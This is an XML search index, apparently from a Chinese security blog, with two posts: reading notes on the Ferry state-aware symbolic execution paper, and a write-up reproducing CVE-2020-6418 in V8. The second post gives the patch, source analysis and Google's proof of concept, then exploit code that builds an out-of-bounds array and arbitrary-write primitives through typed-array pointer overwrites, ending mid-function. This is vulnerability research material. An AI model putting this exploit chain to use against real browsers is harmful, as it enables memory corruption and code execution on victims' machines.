<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>USENIX Security 2022 summer Ferry:State-Aware Symbolic Execution for Exploring State-Dependent Program Paths 阅读笔记</title>
    <url>/ferry/</url>
    <content><![CDATA[<h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><p>提出了程序状态敏感符号执行的概念，着眼于将程序状态引入到符号执行过程中去，分析并提出了将程序内部状态引入符号执行过程的方法，实现了工具Ferry，并针对现实世界中存在的的程序进行了一定优化，在多个具备内部状态的程序上进行测试，取得了良好的成果，发现多个未知漏洞，性能提升较原有研究有明显提升</p>
<h2 id="问题的提出"><a href="#问题的提出" class="headerlink" title="问题的提出"></a>问题的提出</h2><p>符号执行是执行自动化漏洞挖掘任务的有效工具，得到了广泛的运用。符号执行通过符号化变量并进行推导的方式来进行程序执行路径空间的搜索，而不是实际去运行程序。而有很多程序（百分之八十以上，根据作者的调研）存在内部状态的变化，在特定的变量值情况下会走向不同的路径，而这是符号执行方法难以覆盖的。</p>
<h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><pre><code>解决符号执行方法在处理程序内部状态变化上的不足
</code></pre>
<h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><p>对目标程序的范围做限定</p>
<pre><code>针对存在内部状态的程序，具体定义为具有下面三个特点的程序
1、从单个数据源接收序列数据 
2、序列化处理数据 
3、使用一个或多个状态描述变量来确定程序内部状态
</code></pre>
<p>如何描述程序的内部状态</p>
<pre><code>定义状态描述变量（state-describing variable），具有以下两个特征：
1、与输入存在数据依赖（定义为InputDetermined）
2、在某个条件语句中被检查（定义为BranchRelated）
定义引起状态描述变量变化的操作为状态描述变量操作（state-describing-variable operation,SDVO）
SDVO会导致状态描述变量发生以下三类变化：
1、变量生成
2、变量值的改变
3、变量释放
通过以上三类变化可以定位SDVO
</code></pre>
<p>对程序内部状态的定义</p>
<pre><code>1、被一组状态描述变量所决定
2、不同状态至少有一个描述变量值不同
3、不同状态的行为不同
</code></pre>
<h2 id="Ferry工具结构"><a href="#Ferry工具结构" class="headerlink" title="Ferry工具结构"></a>Ferry工具结构</h2><h3 id="总体描述"><a href="#总体描述" class="headerlink" title="总体描述"></a>总体描述</h3><p>三步工作：<br>1、通过符号执行收集变量的InputDetermined和BranchRelated信息，来确定状态描述变量<br>2、通过状态描述变量进行符号执行，来对程序内部状态进行遍历，在不同的内部状态下进行程序执行路径搜索工作<br>3、确定不活跃的状态描述变量，减小记录的状态描述变量数量来提高性能，通过输入分块技术来实现快速对某块代码进行符号执行</p>
<h3 id="状态描述变量识别"><a href="#状态描述变量识别" class="headerlink" title="状态描述变量识别"></a>状态描述变量识别</h3><p>使用动态污点追踪技术 将所有输入标记为污点数据，并将其作为一种数据约束扩散下去，变量中有以下两种情况的将被标记为InputDetermined：<br>1、变量的值能被输入直接赋予的：<br>形如：</p>
<pre><code>var=input
</code></pre>
<p>2、变量的值变化需要判断条件，且条件直接检查输入<br>形如：</p>
<pre><code>if(input)
      var = someting
</code></pre>
<p>以下情况将被标记为BranchRelated：<br>在某个分支语句中作为条件变量被检查<br>形如：</p>
<pre><code>if(var)
      dosomething
else
      dosomethingelse
</code></pre>
<p>两个标记都是全局标记，不局限于单个函数，当两个标记同时存在于一个变量上，该变量即被认为是一个状态描述变量</p>
<p>变量存在存活时间，而过期的状态描述变量对后面的符号执行过程没有帮助，需要被识别出来，识别方式为寻找以下SDVO：<br>1、局部状态描述变量所在函数的return操作<br>2、对状态描述变量的free操作</p>
<p>此时需要检查程序内部状态的变化</p>
<h3 id="程序状态敏感符号执行"><a href="#程序状态敏感符号执行" class="headerlink" title="程序状态敏感符号执行"></a>程序状态敏感符号执行</h3><p>目的是使用程序内部状态信息来引导符号执行过程，分析记录程序可能存在的内部状态<br>方法：使用SDVO和状态描述变量的数据约束来进行状态的确定<br>Ferry记录每个输入的约束，保证输入约束相同，程序执行路径相同<br>同时，程序状态在Ferry这里表现为状态约束变量，两次执行过程中，状态约束变量上的数据约束不同，程序内部状态也不同<br>SDVO的执行会引起状态变化（如问题分析中所说，会改变状态描述变量），SDVO的位置也会被Ferry记录<br>如果有以下情况，就认为两次执行过程的探索到了不同的状态：<br>1、执行到SDVO的位置不同<br>2、状态描述变量的数据约束不同</p>
<p>每次发生状态变化时（即遇到SDVO），Ferry会将探索到的状态与已探索的状态比较，如果是新状态就记录，不是就回滚到上一个SDVO位置重新开始探索</p>
<p>记录状态的方法：所有状态描述变量和它们的数据约束，最后一个SDVO的位置</p>
<p>详细算法如下图：</p>
<img src="/ferry/algorithm.png" class="">
<p>函数符号含义：<br>pickNext()：返回下一个执行路径<br>updateState(s, v, e)：接收原状态s，被赋值变量v和值e，返回新状态s’<br>succ(l)：l指令的后继，就是l的下一条指令<br>isSat()：调用SMT检测器检查是否满足条件检查语句的约束</p>
<p>一次探索状态空间的例子</p>
<img src="/ferry/example.png" class="">

<h3 id="优化方案"><a href="#优化方案" class="headerlink" title="优化方案"></a>优化方案</h3><p>应用上述方法到现实软件上，存在以下两个问题：<br>1、现实软件中的状态描述变量非常多<br>2、现实中的漏洞经常出现在多个状态转换后的深层状态中</p>
<p>提出的优化方法：<br>1、非活跃状态描述变量的状态缩减</p>
<p>作者通过调研发现不同的状态描述变量被访问的频率不同，意味着在状态变化过程中，这些变量的重要程度也是不同的，想到可以只追踪最重要的几个变量，通过实验确定追踪3个变量带来的效果较好，于是设置Ferry的默认追踪数量为3</p>
<p>2、基于输入分块的捷径符号执行</p>
<p>现实世界中，漏洞多存在多个状态转换的深层状态中，但这个深层状态有时候并不需要进行多次状态转换才能达到，有些深层状态前面的状态转换都与无关，只有最后的几次转换（即最后几次分支检查）存在影响。作者以此实现了捷径执行的方法，要求用户手动指定输入格式，Ferry通过分析，将输入中的各个部分分块，识别出哪些部分是真正影响到深层状态的，通过单纯使用这一部分输入，直接跳转分析对应状态相关分支的方法来缩减符号执行的空间</p>
<p>输入分块技术</p>
<pre><code>目的：将输入数据分块，分析出不同状态依赖分支所需要的输入数据区域
方法：监视输入（即IO函数的目标缓冲区），分析每一个转移或复制数据的函数（e.g. memcopy），将转移或复制的目标缓冲区作为后面的状态依赖分支的数据输入，被转移或复制的数据就能被确定为单独的状态依赖数据，输入数据的边界就能被划分出来
原理：作者对现实中的程序做了调研，发现很大一部分程序存在一个现象：对处理状态依赖分支的函数，它会创建一个缓冲区，把它不处理的输入数据复制过去，以便后面的函数使用
</code></pre>
<p>捷径符号执行</p>
<pre><code>目的：快速对目标状态依赖分支的代码进行探索
方法：倒过来符号化输入，利用输入分块的结果，从最后一个块开始符号化，前面的块全部使用实例数据（i.e. 常数），只有当后面执行路径被遍历完了才符号化前面的
原理：当前面的块都使用的实例数据，除了符号化部分数据的对应的代码之外的程序执行路径实际上都是确定的，符号执行引擎就可以快速到达需要被搜索的代码，进行对应分支的代码执行路径工作，相当于取了捷径
</code></pre>
<h3 id="Ferry实现上的一些细节"><a href="#Ferry实现上的一些细节" class="headerlink" title="Ferry实现上的一些细节"></a>Ferry实现上的一些细节</h3><p>使用angr框架，代码量为5097行python，使用Z3来进行约束求解，使用unicorn框架进行输入分块后的输入实例化操作</p>
<h2 id="Ferry的局限性"><a href="#Ferry的局限性" class="headerlink" title="Ferry的局限性"></a>Ferry的局限性</h2><p>对于具有大量内部状态，输入的细微变化都会引起状态变化的程序，Ferry会产生状态爆炸，约束求解会遇到相当严峻的挑战<br>并不完全通用，对于不满足文中定义的程序，如何确定其状态描述变量还是一个问题</p>
]]></content>
      <categories>
        <category>论文笔记</category>
      </categories>
      <tags>
        <tag>符号执行技术</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-6418漏洞复现</title>
    <url>/CVE-2020-6418/</url>
    <content><![CDATA[<h1 id="CVE-2020-6418-分析与利用"><a href="#CVE-2020-6418-分析与利用" class="headerlink" title="CVE-2020-6418 分析与利用"></a>CVE-2020-6418 分析与利用</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>分支：bdaa7d66a37adcc1f1d81c9b0f834327a74ffe07<br>成因：JIT优化过程中对操作的副作用推断错误导致可能的类型混淆</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>看diff文件，diff文件很短，就加了一句。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">index f43a348..ab4ced6 <span class="number">100644</span></span><br><span class="line">--- a/src/compiler/node-properties.cc</span><br><span class="line">+++ b/src/compiler/node-properties.cc</span><br><span class="line"></span><br><span class="line">@@ <span class="number">-386</span>,<span class="number">6</span> +<span class="number">386</span>,<span class="number">7</span> @@</span><br><span class="line">           <span class="comment">// We reached the allocation of the &#123;receiver&#125;.</span></span><br><span class="line">           <span class="keyword">return</span> kNoReceiverMaps;</span><br><span class="line">         &#125;</span><br><span class="line">+        result = kUnreliableReceiverMaps;  <span class="comment">// JSCreate can have side-effect.</span></span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">case</span> IrOpcode::kJSCreatePromise: &#123;</span><br></pre></td></tr></table></figure>
<p>就加了一个result，表示把这个节点标记为类型不可信的节点。<br>具体是为什么，首先要看看v8的一个inlining优化过程<br>inlining优化过程中，会对buildin函数的调用进行优化，减少函数调用到最少。<br>这个优化有两步，第一步是对那些对周围信息依赖比较少，且能对后面的优化提供便利的函数，会先调用ReduceJSCall来优化，然后是第二步对那些具有强依赖的函数进行优化。<br>这里我们关注第一步，也就是ReduceJSCall，它的源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// compiler/js-call-reducer.cc:3906</span></span><br><span class="line">Reduction <span class="title function_">JSCallReducer::ReduceJSCall</span><span class="params">(Node* node,</span></span><br><span class="line"><span class="params">                                      <span class="type">const</span> SharedFunctionInfoRef&amp; shared)</span> &#123;</span><br><span class="line">  DCHECK_EQ(IrOpcode::kJSCall, node-&gt;opcode());</span><br><span class="line">  Node* target = NodeProperties::GetValueInput(node, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Do not reduce calls to functions with break points.</span></span><br><span class="line">  <span class="keyword">if</span> (shared.HasBreakInfo()) <span class="keyword">return</span> NoChange();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Raise a TypeError if the &#123;target&#125; is a &quot;classConstructor&quot;.</span></span><br><span class="line">  <span class="keyword">if</span> (IsClassConstructor(shared.kind())) &#123;</span><br><span class="line">    NodeProperties::ReplaceValueInputs(node, target);</span><br><span class="line">    NodeProperties::ChangeOp(</span><br><span class="line">        node, javascript()-&gt;CallRuntime(</span><br><span class="line">                  Runtime::kThrowConstructorNonCallableError, <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">return</span> Changed(node);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check for known builtin functions.</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> builtin_id =</span><br><span class="line">      shared.HasBuiltinId() ? shared.builtin_id() : Builtins::kNoBuiltinId;</span><br><span class="line">  <span class="keyword">switch</span> (builtin_id) &#123;</span><br><span class="line">    <span class="keyword">case</span> Builtins::kArrayConstructor:</span><br><span class="line">      <span class="keyword">return</span> ReduceArrayConstructor(node);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> Builtins::kReflectConstruct:</span><br><span class="line">      <span class="keyword">return</span> ReduceReflectConstruct(node);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> Builtins::kArrayPrototypePop:</span><br><span class="line">      <span class="keyword">return</span> ReduceArrayPrototypePop(node);</span><br></pre></td></tr></table></figure>
<p>它会通过builtin_id来确定调用哪个reduce函数</p>
<p>这里在优化的时候，它会在优化时确定操作对象的类型，以此来快速确定用什么方法处理。这就需要用一个方法来确定函数执行的时候对象具体是什么类型</p>
<p>v8确定对象类型用的是MapInference这个属性，在优化的时候检查传入的map和对象的effect，如果effect确定map可靠，就不再做类型检查，直接按最初的类型做调用，否则就需要类型检查了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// compiler/map-inference.h:25</span></span><br><span class="line"><span class="comment">// The MapInference class provides access to the &quot;inferred&quot; maps of an</span></span><br><span class="line"><span class="comment">// &#123;object&#125;. This information can be either &quot;reliable&quot;, meaning that the object</span></span><br><span class="line"><span class="comment">// is guaranteed to have one of these maps at runtime, or &quot;unreliable&quot;, meaning</span></span><br><span class="line"><span class="comment">// that the object is guaranteed to have HAD one of these maps.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// The MapInference class does not expose whether or not the information is</span></span><br><span class="line"><span class="comment">// reliable. A client is expected to eventually make the information reliable by</span></span><br><span class="line"><span class="comment">// calling one of several methods that will either insert map checks, or record</span></span><br><span class="line"><span class="comment">// stability dependencies (or do nothing if the information was already</span></span><br><span class="line"><span class="comment">// reliable).</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// compiler/map-inference.cc:18</span></span><br><span class="line">MapInference::MapInference(JSHeapBroker* broker, Node* object, Node* effect)</span><br><span class="line">    : broker_(broker), object_(object) &#123;</span><br><span class="line">  ZoneHandleSet&lt;Map&gt; maps;</span><br><span class="line">  <span class="keyword">auto</span> result =</span><br><span class="line">      NodeProperties::InferReceiverMapsUnsafe(broker_, object_, effect, &amp;maps);</span><br><span class="line">  maps_.insert(maps_.end(), maps.begin(), maps.end());</span><br><span class="line">  maps_state_ = (result == NodeProperties::kUnreliableReceiverMaps)</span><br><span class="line">                    ? kUnreliableDontNeedGuard</span><br><span class="line">                    : kReliableOrGuarded;</span><br><span class="line">  DCHECK_EQ(maps_.empty(), result == NodeProperties::kNoReceiverMaps);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在确定map是否有效时，会调用InferReceiverMapsUnsafe函数，也就是它patch的函数。这个函数会遍历输入对象的effect链，查看链上的每一个节点是否会产生副作用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// compiler/node-properties.cc:337</span></span><br><span class="line"><span class="comment">// static</span></span><br><span class="line">NodeProperties::InferReceiverMapsResult NodePperts::InferReceiverMapsUnsafe的返回值来判断，如果是(</span><br><span class="line">    JSHeapBroker* broker, Node* receiver, Node* effect,</span><br><span class="line">    ZoneHandleSet&lt;Map&gt;* maps_return) &#123;</span><br><span class="line">  HeapObjectMatcher <span class="title function_">m</span><span class="params">(receiver)</span>;</span><br><span class="line">  <span class="keyword">if</span> (m.HasValue()) &#123;</span><br><span class="line">    HeapObjectRef receiver = m.Ref(broker);</span><br><span class="line">    <span class="comment">// We don&#x27;t use ICs for the Array.prototype and the Object.prototype</span></span><br><span class="line">    <span class="comment">// because the runtime has to be able to intercept them properly, so</span></span><br><span class="line">    <span class="comment">// we better make sure that TurboFan doesn&#x27;t outsmart the system here</span></span><br><span class="line">    <span class="comment">// by storing to elements of either prototype directly.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// TODO(bmeurer): This can be removed once the Array.prototype and</span></span><br><span class="line">    <span class="comment">// Object.prototype have NO_ELEMENTS elements kind.</span></span><br><span class="line">    <span class="keyword">if</span> (!receiver.IsJSObject() ||</span><br><span class="line">        !broker-&gt;IsArrayOrObjectPrototype(receiver.AsJSObject())) &#123;</span><br><span class="line">      <span class="keyword">if</span> (receiver.<span class="built_in">map</span>().is_stable()) &#123;</span><br><span class="line">        <span class="comment">// The &#123;receiver_map&#125; is only reliable when we install a stability</span></span><br><span class="line">        <span class="comment">// code dependency.</span></span><br><span class="line">        *maps_return = ZoneHandleSet&lt;Map&gt;(receiver.<span class="built_in">map</span>().object());</span><br><span class="line">        <span class="keyword">return</span> kUnreliableReceiverMaps;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  InferReceiverMapsResult result = kReliableReceiverMaps;</span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (effect-&gt;opcode()) &#123;</span><br><span class="line">      <span class="keyword">case</span> IrOpcode::kMapGuard: &#123;</span><br><span class="line">        Node* <span class="type">const</span> object = GetValueInput(effect, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (IsSame(receiver, object)) &#123;</span><br><span class="line">          *maps_return = MapGuardMapsOf(effect-&gt;op());</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">case</span> IrOpcode::kCheckMaps: &#123;</span><br><span class="line">        Node* <span class="type">const</span> object = GetValueInput(effect, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (IsSame(receiver, object)) &#123;</span><br><span class="line">          *maps_return = CheckMapsParametersOf(effect-&gt;op()).maps();</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">case</span> IrOpcode::kJSCreate: &#123;</span><br><span class="line">        <span class="keyword">if</span> (IsSame(receiver, effect)) &#123;</span><br><span class="line">          base::Optional&lt;MapRef&gt; initial_map = GetJSCreateMap(broker, receiver);</span><br><span class="line">          <span class="keyword">if</span> (initial_map.has_value()) &#123;</span><br><span class="line">            *maps_return = ZoneHandleSet&lt;Map&gt;(initial_map-&gt;object());</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// We reached the allocation of the &#123;receiver&#125;.</span></span><br><span class="line">          <span class="keyword">return</span> kNoReceiverMaps;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">default</span>: &#123;</span><br><span class="line">        DCHECK_EQ(<span class="number">1</span>, effect-&gt;op()-&gt;EffectOutputCount());</span><br><span class="line">        <span class="keyword">if</span> (effect-&gt;op()-&gt;EffectInputCount() != <span class="number">1</span>) &#123;</span><br><span class="line">          <span class="comment">// Didn&#x27;t find any appropriate CheckMaps node.</span></span><br><span class="line">          <span class="keyword">return</span> kNoReceiverMaps;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!effect-&gt;op()-&gt;HasProperty(Operator::kNoWrite)) &#123;</span><br><span class="line">          <span class="comment">// Without alias/escape analysis we cannot tell whether this</span></span><br><span class="line">          <span class="comment">// &#123;effect&#125; affects &#123;receiver&#125; or not.</span></span><br><span class="line">          result = kUnreliableReceiverMaps;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">...</span><br><span class="line">    <span class="comment">// Stop walking the effect chain once we hit the definition of</span></span><br><span class="line">    <span class="comment">// the &#123;receiver&#125; along the &#123;effect&#125;s.</span></span><br><span class="line">    <span class="keyword">if</span> (IsSame(receiver, effect)) <span class="keyword">return</span> kNoReceiverMaps;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Continue with the next &#123;effect&#125;.</span></span><br><span class="line">    DCHECK_EQ(<span class="number">1</span>, effect-&gt;op()-&gt;EffectInputCount());</span><br><span class="line">    effect = NodeProperties::GetEffectInput(effect);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>总的来说，一个高优先级的builtin函数的优化过程大致如下：<br>1、得到函数对应节点的value、effect和control输入<br>2、调用MapInference来获取对象的map来确定类型，如果没有就不优化。<br>3、调用RelyOnMapsPreferStability，来查看获取的类型是否可靠，如果可靠就不会进行类型检查。这里的可靠与否就是通过前面的InferReceiverMapsUnsafe的返回值来判断，如果是kUnreliableReceiverMaps就不可靠，否则可靠<br>4、通过类型信息判断如何执行相应的函数指令</p>
<p>而这个漏洞成因，就在patch的那一段中，它patch了kJSCreate类型节点的返回值，认为其是不可靠的，而漏洞版本中则认为它可靠。这里的问题就在于，在可以转换成kJSCreate类型节点的函数Reflect.construct中，可以接收一个proxy对象作为参数，通过在对象中重定义回调函数的方式可以对对象的类型进行转换，使得优化之后，产生的函数操作类型与对象是不同的，就产生了一个类型混淆的漏洞。</p>
<p>google提供的poc：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Copyright 2020 the V8 project authors. All rights reserved.</span></span><br><span class="line"><span class="comment">// Use of this source code is governed by a BSD-style license that can be</span></span><br><span class="line"><span class="comment">// found in the LICENSE file.</span></span><br><span class="line"><span class="comment">// Flags: --allow-natives-syntax</span></span><br><span class="line"><span class="keyword">let</span> a = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">empty</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">p</span>) &#123;</span><br><span class="line">  a.<span class="title function_">pop</span>(<span class="title class_">Reflect</span>.<span class="title function_">construct</span>(empty, <span class="variable language_">arguments</span>, p));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Proxy</span>(<span class="title class_">Object</span>, &#123;</span><br><span class="line">    <span class="attr">get</span>: <span class="function">() =&gt;</span> (a[<span class="number">0</span>] = <span class="number">1.1</span>, <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>)</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params">p</span>) &#123;</span><br><span class="line">  <span class="title function_">f</span>(p);</span><br><span class="line">&#125;</span><br><span class="line">%<span class="title class_">PrepareFunctionForOptimization</span>(empty);</span><br><span class="line">%<span class="title class_">PrepareFunctionForOptimization</span>(f);</span><br><span class="line">%<span class="title class_">PrepareFunctionForOptimization</span>(main);</span><br><span class="line"><span class="title function_">main</span>(empty);</span><br><span class="line"><span class="title function_">main</span>(empty);</span><br><span class="line">%<span class="title class_">OptimizeFunctionOnNextCall</span>(main);</span><br><span class="line"><span class="title function_">main</span>(p);</span><br></pre></td></tr></table></figure>
<p>poc的关键在于那个f函数。他在a对象的pop函数中嵌套了Reflect.construct函数，这个函数的作用为运行第一个参数对应是想要运行的函数，以第二个参数为函数的参数，第三个是可选的，作为第一个的构造函数使用。它这个proxy替换了()方法，这个empty函数在被Reflect.construct调用的时候，由于是用的proxy作为constructor，它的()对应的是修改a的类型为浮点数的功能，然后在触发优化之后，由于上面的漏洞，这里的pop调用的仍然是SMI的pop，只会弹出四个字节，而这个数组实际上已经是以八个字节为单位了，就会出现问题。这里在debug版的d8下后面使用a数组的时候会出现未对齐的错误。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="构造越界数组"><a href="#构造越界数组" class="headerlink" title="构造越界数组"></a>构造越界数组</h3><p>既然我们可以用这个漏洞来使一个浮点数组调用整形数组的pop，我们也可以让一个整形数组调用浮点数组的push，来做到越界写一个值，通过调整数组大小，我们可以让这个值覆盖到下一个数组的length位，构造一个越界数组。<br>相关代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = [<span class="number">1.1</span>,,,,,,,,,,,,,,,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>]</span><br><span class="line"><span class="keyword">let</span> oobarray;</span><br><span class="line"><span class="keyword">let</span> arbarray; </span><br><span class="line">a.<span class="title function_">pop</span>();</span><br><span class="line">a.<span class="title function_">pop</span>();</span><br><span class="line">a.<span class="title function_">pop</span>();</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">empty</span>(<span class="params"></span>) &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">p</span>) </span><br><span class="line">&#123;</span><br><span class="line">    a.<span class="title function_">push</span>(<span class="title function_">typeof</span>(<span class="title class_">Reflect</span>.<span class="title function_">construct</span>(empty, <span class="variable language_">arguments</span>, p)) === <span class="title class_">Proxy</span>?<span class="number">0.2</span>:<span class="number">156842065920.05</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i&lt;<span class="number">0x3003</span>;i++)&#123;<span class="title function_">empty</span>()&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Proxy</span>(<span class="title class_">Object</span>, &#123;</span><br><span class="line">    <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        a[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">        oobarray = [<span class="number">1.1</span>];</span><br><span class="line">        arbarray = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(<span class="number">8</span>);</span><br><span class="line">        arbarray[<span class="number">0</span>] = <span class="number">0x1111111111111111n</span>;</span><br><span class="line">        arbarray[<span class="number">1</span>] = <span class="number">0x2222222222222222n</span>;</span><br><span class="line">        arbarray[<span class="number">2</span>] = <span class="number">0x3333333333333333n</span>;</span><br><span class="line">        arbarray[<span class="number">3</span>] = <span class="number">0x4444444444444444n</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">exp</span>(<span class="params">nt</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i&lt;<span class="number">0x3003</span>;i++)<span class="title function_">empty</span>();</span><br><span class="line">    <span class="title function_">f</span>(nt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">exp</span>(empty);</span><br><span class="line"><span class="title function_">exp</span>(empty);</span><br><span class="line"><span class="title function_">exp</span>(p);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(oobarray.<span class="property">length</span>);</span><br></pre></td></tr></table></figure>

<p>通过构造数组长度，覆盖oobarray的length位，使得oobarray能够越界读写。这里使用exp函数作为壳的原因为在优化的时候，如果不套这一层，不会产生JSCreate节点。</p>
<p>后面就是利用oobarray构造任意地址读写</p>
<p>这里构造任意地址读写用的是UInt64Array，因为这个版本下存在指针压缩，用这个可以做到获取指针压缩下的高位地址，而且修改它的base ptr和external ptr可以做到任意地址写，修改len可以修改写入的长度。<br>通过调试可以得到oobarray的数组头距离我们需要修改的三个值的偏移，不一定相同。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">ByteToBigIntArray</span>(<span class="params">payload</span>)  <span class="comment">//用来把字节转换成BigInt数组，所以任意写入的数据要用字节的方式表示</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> sc = []</span><br><span class="line">    <span class="keyword">let</span> tmp = <span class="number">0n</span>;</span><br><span class="line">    <span class="keyword">let</span> lenInt = <span class="title class_">BigInt</span>(<span class="title class_">Math</span>.<span class="title function_">floor</span>(payload.<span class="property">length</span>/<span class="number">8</span>))</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0n</span>; i &lt; lenInt; i += <span class="number">1n</span>) &#123;</span><br><span class="line">        tmp = <span class="number">0n</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> j=<span class="number">0n</span>; j&lt;<span class="number">8n</span>; j++)&#123;</span><br><span class="line">            tmp += <span class="title class_">BigInt</span>(payload[i*<span class="number">8n</span>+j])*(<span class="number">0x1n</span>&lt;&lt;(<span class="number">8n</span>*j));</span><br><span class="line">        &#125;</span><br><span class="line">        sc.<span class="title function_">push</span>(tmp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> len = payload.<span class="property">length</span>%<span class="number">8</span>;</span><br><span class="line">    tmp = <span class="number">0n</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0n</span>; i&lt;len; i++)&#123;</span><br><span class="line">        tmp += <span class="title class_">BigInt</span>(payload[lenInt*<span class="number">8n</span>+i])*(<span class="number">0x1n</span>&lt;&lt;(<span class="number">8n</span>*i));</span><br><span class="line">    &#125;</span><br><span class="line">    sc.<span class="title function_">push</span>(tmp);</span><br><span class="line">    <span class="keyword">return</span> sc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbWrite</span>(<span class="params">addr,buf</span>)</span><br><span class="line">&#123;</span><br><span class="line">    sc = <span class="title class_">ByteToBigIntArray</span>(buf);</span><br><span class="line">    oobarray[<span class="number">22</span>] = mem.<span class="title function_">i2f</span>(<span class="title class_">BigInt</span>(sc.<span class="property">length</span>));</span><br><span class="line">    oobarray[<span class="number">23</span>] = mem.<span class="title function_">i2f</span>(comphigh);</span><br><span class="line">    oobarray[<span class="number">24</span>] = mem.<span class="title function_">i2f</span>(addr);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sc.<span class="property">length</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        arbarray[i] = sc[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbWrite_nocomp</span>(<span class="params">addr,buf</span>)</span><br><span class="line">&#123;</span><br><span class="line">    sc = <span class="title 